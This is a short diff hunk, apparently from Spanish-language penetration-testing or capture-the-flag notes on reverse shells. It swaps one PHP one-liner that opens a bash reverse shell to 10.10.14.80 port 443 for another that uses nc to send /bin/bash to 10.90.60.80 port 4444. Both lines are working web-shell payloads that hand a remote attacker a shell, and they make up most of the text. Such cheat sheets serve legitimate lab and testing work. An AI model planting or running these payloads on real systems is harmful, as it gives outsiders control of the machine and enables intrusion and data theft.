@@ -1047,7 +1047,7 @@ Una variacion de reverse shell
 Una con nc
 
 ```
-<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.80/443 0>&1'"); ?>
+<?php system("nc 10.90.60.80 4444 -e /bin/bash"); ?>
 ```
 
 ## disown
